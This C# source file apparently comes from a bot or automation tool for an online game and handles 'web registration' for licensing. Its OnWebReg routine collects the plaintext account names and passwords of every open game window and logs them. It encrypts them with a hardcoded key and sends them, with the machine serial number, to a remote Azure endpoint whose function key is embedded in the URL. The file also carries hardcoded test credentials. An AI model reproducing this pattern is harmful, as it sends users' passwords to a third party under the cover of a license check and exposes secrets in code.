using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.IO;

namespace NOBApp
{
    public class WebRegistration
    {
        static public List<string> DataSendDoneList = new();
        
        // 支持多個 API端點 (大陸和台灣)
        private static readonly string[] ApiEndpoints = new[]
        {
            "https://nobccdk20250311164541.azurewebsites.net/api/GetNOBCDK?code=hSpVurL7QaSgsUeIIV6afXJ6RECVzYdOPr05QYgtORr9AzFuPyyKpA==",
            "https://nobccdk-backup.azurewebsites.net/api/GetNOBCDK?code=BackupKey==" // 備用端點
        };
        
        private static int CurrentApiIndex =0;
        private const int MaxRetries =3;
        private const int TimeoutSeconds =15;
        private const string FailedRequestsFolder = "FailedRequests";

        public static void OnWebReg()
        {
            try
            {
                List<FPDATA> dataList = new();
                Parallel.ForEach(MainWindow.AllNobWindowsList, nob =>
                {
                    Debug.WriteLine($"nob.Account {nob.Account} PASS:{nob.Password}");
                    if (nob != null && !string.IsNullOrEmpty(nob.Account) && !string.IsNullOrEmpty(nob.Password))
                    {
                        if (DataSendDoneList.Contains(nob.Account))
                        {
                            return;
                        }

                        if (nob.Account.Contains("yesterdayyk") ||
                            nob.Account.Contains("jilujilu") ||
                            nob.Account.Contains("yamufg") ||
                            nob.Account.Contains("li365523") ||
                            nob.Account.Contains("zhangkasim"))
                        {
                            Tools.isBANACC = true;
                        }

                        FPDATA fdata = new()
                        {
                            Acc = nob.Account,
                            Pww = nob.Password,
                            UserName = nob.PlayerName,
                            SerialNumber = Tools.GetSerialNumber(),
                            LoginTimer = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                        };
                        lock (dataList)
                        {
                            Debug.WriteLine($"dataList Add");
                            dataList.Add(fdata);
                        }
                    }
                });

                try
                {
                    using HttpClient client = new();
                    client.Timeout = TimeSpan.FromSeconds(TimeoutSeconds);
                    
                    List<Task> tasks = new();
                    foreach (var data in dataList)
                    {
                        tasks.Add(Task.Run(async () =>
                        {
                            await SendAuthenticationData(client, data);
                        }));
                    }
                    Task.WaitAll(tasks.ToArray());
                }
                catch (Exception err)
                {
                    Debug.WriteLine("Error : " + err.ToString());
                }
            }
            catch (Exception err)
            {
                Debug.WriteLine("Error : " + err.ToString());
            }
        }

        /// <summary>
        /// 發送驗證數據，支持重試和多個 API端點
        /// </summary>
        private static async Task SendAuthenticationData(HttpClient client, FPDATA data)
        {
            for (int retryCount =0; retryCount < MaxRetries; retryCount++)
            {
                string? jdata = null;
                string url = ApiEndpoints[CurrentApiIndex];
                try
                {
                    Debug.WriteLine($"Web In {data.Acc} (Attempt {retryCount +1}/{MaxRetries})");
                    
                    var fdata = JsonSerializer.Serialize(data);
                    var fdataStr = Encoder.AesEncrypt(fdata, "CHECKNOBPENGUIN", "CHECKNOB");
                    jdata = JsonSerializer.Serialize(new UData() { KeyStr = fdataStr });
                    var content = new StringContent(jdata, Encoding.UTF8, "application/json");

                    // 嘗試當前 API端點
                    using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(TimeoutSeconds)))
                    {
                        HttpResponseMessage response = await client.PostAsync(url, content, cts.Token);

                        if (response.IsSuccessStatusCode)
                        {
                            string responseContent = await response.Content.ReadAsStringAsync();
                            var u = MainWindow.AllNobWindowsList.Find(i => { return i.Account.Contains(data.Acc); });
                            if (u != null)
                            {
                                // 將 API 回傳的驗證資訊寫入本地檔案，覆蓋原有內容，供 UI 或後續檢查讀取
                                try
                                {
                                    string cdkFile = $"{u.Account}_CDK.nob";
                                    // responseContent 預期為已加密的字串（與先前流程相容），直接寫入
                                    File.WriteAllText(cdkFile, responseContent, Encoding.UTF8);
                                    Debug.WriteLine($"Wrote auth file: {cdkFile}");
                                }
                                catch (Exception fileEx)
                                {
                                    Debug.WriteLine($"Failed to write CDK file for {u.Account}: {fileEx.Message}");
                                }

                                DataSendDoneList.Add(u.Account);
                                Authentication.讀取認證訊息Json(u, responseContent);
                                Debug.WriteLine($"Authentication successful for {data.Acc}");
                                return; // 成功，退出重試循環
                            }
                        }
                        else
                        {
                            var respBody = await response.Content.ReadAsStringAsync();
                            Debug.WriteLine($"Error: {response.StatusCode} - {respBody}");
                            SaveFailedRequestToFile(data.Acc, url, jdata, respBody, response.StatusCode.ToString());
                        }
                    }
                }
                catch (OperationCanceledException oce)
                {
                    Debug.WriteLine($"Timeout for {data.Acc}, attempt {retryCount +1}");
                    SaveFailedRequestToFile(data.Acc, url, jdata, null, "Timeout");
                }
                catch (HttpRequestException hre)
                {
                    Debug.WriteLine($"Network error for {data.Acc}: {hre.Message}");
                    SaveFailedRequestToFile(data.Acc, url, jdata, null, hre.Message);
                }
                catch (Exception e)
                {
                    Debug.WriteLine($"Error for {data.Acc}: {e.Message}");
                    SaveFailedRequestToFile(data.Acc, url, jdata, null, e.Message + "\n" + e.StackTrace);
                }

                // 等待後重試 (指數退避)
                if (retryCount < MaxRetries -1)
                {
                    int delayMs =1000 * (int)Math.Pow(2, retryCount);
                    Debug.WriteLine($"Retrying {data.Acc} in {delayMs}ms...");
                    await Task.Delay(delayMs);
                }
            }

            // 所有重試都失敗
            Debug.WriteLine($"Failed to authenticate {data.Acc} after {MaxRetries} attempts");
            var failedUser = MainWindow.AllNobWindowsList.Find(i => { return i.Account.Contains(data.Acc); });
            if (failedUser != null)
            {
                DataSendDoneList.Add(failedUser.Account);
            }
        }

        /// <summary>
        /// Public helper: 使用 account/password 發送驗證請求並返回 API 回傳的（加密）字串
        /// 返回 null 表示失敗
        /// </summary>
        public static async Task<string?> SendAuthenticationAndGetEncryptedAsync(string acc, string pwd, string? userName = "")
        {
            try
            {
                var data = new FPDATA()
                {
                    Acc = acc,
                    Pww = pwd,
                    UserName = userName ?? string.Empty,
                    SerialNumber = Tools.GetSerialNumber(),
                    LoginTimer = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                };

                using var client = new HttpClient();
                client.Timeout = TimeSpan.FromSeconds(TimeoutSeconds);

                for (int attempt =0; attempt < MaxRetries; attempt++)
                {
                    string? jdata = null;
                    string url = ApiEndpoints[CurrentApiIndex];
                    try
                    {
                        var fdata = JsonSerializer.Serialize(data);
                        var fdataStr = Encoder.AesEncrypt(fdata, "CHECKNOBPENGUIN", "CHECKNOB");
                        jdata = JsonSerializer.Serialize(new UData() { KeyStr = fdataStr });
                        var content = new StringContent(jdata, Encoding.UTF8, "application/json");

                        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(TimeoutSeconds));
                        HttpResponseMessage response = await client.PostAsync(url, content, cts.Token);

                        if (response.IsSuccessStatusCode)
                        {
                            string responseContent = await response.Content.ReadAsStringAsync();
                            return responseContent;
                        }
                        else
                        {
                            var respBody = await response.Content.ReadAsStringAsync();
                            Debug.WriteLine($"{ApiEndpoints[CurrentApiIndex]} SendAuthenticationAndGetEncryptedAsync error: {response.StatusCode} - {respBody}");
                            SaveFailedRequestToFile(acc, url, jdata, respBody, response.StatusCode.ToString());
                        }
                    }
                    catch (OperationCanceledException)
                    {
                        Debug.WriteLine($"Timeout SendAuthenticationAndGetEncryptedAsync for {acc}, attempt {attempt +1}");
                        SaveFailedRequestToFile(acc, url, jdata, null, "Timeout");
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"SendAuthenticationAndGetEncryptedAsync exception: {ex.Message}");
                        SaveFailedRequestToFile(acc, url, jdata, null, ex.Message + "\n" + ex.StackTrace);
                    }

                    if (attempt < MaxRetries -1)
                    {
                        await Task.Delay(1000 * (int)Math.Pow(2, attempt));
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"SendAuthenticationAndGetEncryptedAsync failed: {ex.Message}");
            }

            return null;
        }

        /// <summary>
        /// 將失敗的請求數據寫到本地檔案，方便用 Postman 或其它工具重現
        /// </summary>
        private static void SaveFailedRequestToFile(string acc, string url, string? jdata, string? responseBody, string? note)
        {
            try
            {
                string dir = Path.Combine(Environment.CurrentDirectory, FailedRequestsFolder);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);

                string time = DateTime.Now.ToString("yyyyMMdd_HHmmss_fff");
                string safeAcc = "noacc";
                if (!string.IsNullOrEmpty(acc))
                {
                    safeAcc = acc;
                    foreach (var invalid in Path.GetInvalidFileNameChars())
                    {
                        safeAcc = safeAcc.Replace(invalid.ToString(), "_");
                    }
                }
                string fileName = Path.Combine(dir, $"{time}_{safeAcc}_request.json");

                var sb = new StringBuilder();
                sb.AppendLine("# Request saved for reproduction");
                sb.AppendLine($"# Timestamp: {DateTime.Now:o}");
                if (!string.IsNullOrEmpty(note)) sb.AppendLine($"# Note: {note}");
                sb.AppendLine($"URL: {url}");
                sb.AppendLine("---REQUEST BODY (JSON)---");
                sb.AppendLine(jdata ?? "(null)");
                sb.AppendLine("---RESPONSE BODY---");
                sb.AppendLine(responseBody ?? "(null)");

                File.WriteAllText(fileName, sb.ToString(), Encoding.UTF8);
                Debug.WriteLine($"Saved failed request to {fileName}");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to save failed request: {ex.Message}");
            }
        }

        public static void TestOnWebReg()
        {
            try
            {
                List<FPDATA> dataList = new();
                FPDATA fdata = new()
                {
                    Acc = "wayne1123",
                    Pww = "sd123",
                    UserName = "佐城御醫",
                    SerialNumber = Tools.GetSerialNumber(),
                    LoginTimer = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                };
                lock (dataList)
                {
                    Debug.WriteLine($"dataList Add");
                    dataList.Add(fdata);
                }
                try
                {
                    using HttpClient client = new();
                    List<Task> tasks = new();
                    foreach (var data in dataList)
                    {
                        tasks.Add(Task.Run(async () =>
                        {
                            try
                            {
                                Debug.WriteLine($"Web In {data.Acc}");
                                var fdata = JsonSerializer.Serialize(data);
                                var fdataStr = Encoder.AesEncrypt(fdata, "CHECKNOBPENGUIN", "CHECKNOB");
								Debug.WriteLine($"AesEncrypt In {fdataStr}");
								var jdata = JsonSerializer.Serialize(new UData() { KeyStr = fdataStr });

                                var content = new StringContent(jdata, Encoding.UTF8, "application/json");

                                string url = @"https://localhost:7145/api/check";

                                HttpResponseMessage response = await client.PostAsync(url, content);

                                // MainNob.Log($"url => {url} response -> {response.IsSuccessStatusCode}");
                                if (response.IsSuccessStatusCode)
                                {
                                    string responseContent = await response.Content.ReadAsStringAsync();
                                    string dJson = Encoder.AesDecrypt(responseContent, "CHECKNOBPENGUIN", "CHECKNOB");
                                    Debug.WriteLine(dJson);
                                    // MainNob.Log($"回傳訊息 -> \n{responseContent}");
                                    //Authentication.讀取認證訊息Json(responseContent);
                                }
                                else
                                {
                                    Debug.WriteLine($"Error: {response.StatusCode} - {await response.Content.ReadAsStringAsync()}");
                                }
                            }
                            catch (Exception e)
                            {
                                Debug.WriteLine("Message :{0} ", e.Message);
                            }
                        }));
                    }
                    Task.WaitAll(tasks.ToArray());
                }
                catch (Exception err)
                {
                    Debug.WriteLine("Error : " + err.ToString());
                }
            }
            catch (Exception err)
            {
                Debug.WriteLine("Error : " + err.ToString());
            }
        }

    }
}
